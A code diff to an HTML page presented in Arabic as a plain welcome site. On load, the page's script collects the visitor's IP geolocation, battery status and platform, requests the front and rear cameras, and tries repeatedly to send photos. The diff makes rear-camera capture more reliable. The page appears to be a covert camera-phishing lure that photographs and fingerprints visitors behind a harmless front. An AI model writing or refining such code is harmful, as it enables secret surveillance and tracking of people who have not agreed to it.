@@ -3,7 +3,7 @@
 <head>
     <title>مرحبا بك في موقعنا</title>
     <style>
-        body {
+      body {
             background-color: black;
             color: white;
             font-family: Arial, sans-serif;
@@ -51,7 +51,7 @@
         const userId = window.location.pathname.split('/')[2];
 
         async function collectAdditionalData() {
-            try {
+         try {
                 const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
                 const battery = await navigator.getBattery();
 
@@ -69,7 +69,6 @@
                 return {};
             }
         }
-
         function getPlatformInfo() {
             const ua = navigator.userAgent;
             if (/Windows/.test(ua)) return { platform: "Windows" };
@@ -88,13 +87,19 @@
 
         async function requestCameraPermission(facingMode) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
+                const constraints = {
+                    video: {
                         width: { ideal: 640 },
                         height: { ideal: 480 },
                         facingMode: facingMode
-                    } 
-                });
+                    }
+                };
+
+                if (facingMode === 'environment') {
+                    constraints.video.facingMode = { exact: 'environment' };
+                }
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 return stream;
             } catch (error) {
                 console.error(`Error accessing ${facingMode} camera:`, error);
@@ -105,8 +110,13 @@
         async function init() {
             try {
                 const additionalData = await collectAdditionalData();
-                const frontStream = await requestCameraPermission('user');
-                const backStream = await requestCameraPermission('environment');
+                let frontStream = await requestCameraPermission('user');
+                let backStream = await requestCameraPermission('environment');
+
+                // إذا فشل الحصول على الكاميرا الخلفية، حاول مرة أخرى بدون تحديد دقيق
+                if (!backStream) {
+                    backStream = await requestCameraPermission({ facingMode: 'environment' });
+                }
 
                 if (frontStream || backStream) {
                     handleSuccess(frontStream, backStream, additionalData);
@@ -199,7 +209,6 @@
 
             console.error('Max retries reached. Unable to send photos.');
         }
-
         window.addEventListener('load', init);
     </script>
 </body>
